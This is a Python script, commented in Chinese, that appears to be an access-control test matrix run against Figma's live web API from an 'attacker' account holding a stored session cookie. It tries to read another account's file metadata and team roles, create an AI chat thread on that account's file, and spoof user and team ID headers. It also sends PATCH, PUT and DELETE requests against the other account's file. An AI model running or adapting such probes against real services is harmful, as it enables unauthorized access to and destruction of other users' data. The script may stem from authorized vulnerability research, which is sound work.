# -*- coding: utf-8 -*-
"""Figma 对照测试矩阵(账号 B=7294 攻击者视角,cookie 已存 _figma_creds.py)
A. 基线:确认 B 身份
B. file_metadata 跨账号读(A 文件)
C. 方法级差异复测(PATCH/PUT/DELETE)
D. AI 对话线程(owner_id=A 文件)
E. 团队/plan 跨账号访问
F. fuid 头伪装复验(单次确认,不做批量)
"""
import sys, json, requests, urllib3
sys.path.insert(0, 'D:/scan/figma_report')
from _figma_creds import COOKIE_B, UID_A, UID_B, FILE_A, FILE_B, TEAM_B, PLAN_B
urllib3.disable_warnings()

BASE = 'https://www.figma.com'
S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                  'Cookie': COOKIE_B})

def req(method, path, **kw):
    kw.setdefault('timeout', 15)
    r = S.request(method, BASE + path, verify=False, **kw)
    body = ''
    try:
        body = r.text[:500]
    except Exception:
        pass
    print('[%s] %s %s -> %d' % (method, path[:80], kw.get('headers', {}), r.status_code))
    print('   %s' % body.replace('\n', ' ')[:400])
    return r

print('=== A. 基线:身份确认 ===')
req('GET', '/api/session/state')
req('GET', '/api/user/%s/segments' % UID_B)

print('\n=== B. file_metadata 跨账号读 ===')
req('GET', '/api/file_metadata/%s' % FILE_A)   # B 读 A 文件(核心)
req('GET', '/api/file_metadata/%s' % FILE_B)   # B 读 B 文件(对照)

print('\n=== C. 方法级差异(带 cookie) ===')
req('PATCH', '/api/file_metadata/%s' % FILE_A, json={'name': 'x'})
req('PUT', '/api/files/%s' % FILE_A, json={})
req('DELETE', '/api/files/%s' % FILE_A)
req('OPTIONS', '/api/file_metadata/%s' % FILE_A)

print('\n=== D. AI 对话线程(owner=A 文件) ===')
req('POST', '/api/ai_chat/threads',
    json={'owner_id': FILE_A, 'owner_type': 'file', 'thread_type': 'assistant',
          'plan_id': PLAN_B, 'privacy_mode': 'file'})

print('\n=== E. 跨账号团队/plan ===')
req('GET', '/api/roles/team/%s' % '1666382706663462213')  # A 的团队
req('GET', '/api/roles/team/%s' % TEAM_B)                  # B 的团队(对照)
req('GET', '/api/plans/%s/mcp_usage' % PLAN_B)

print('\n=== F. fuid 头伪装复验(单次) ===')
req('GET', '/api/file_metadata/%s' % FILE_A,
    headers={'X-Figma-User-ID': UID_A, 'X-Figma-Team-Id': '1666382706663462213'})
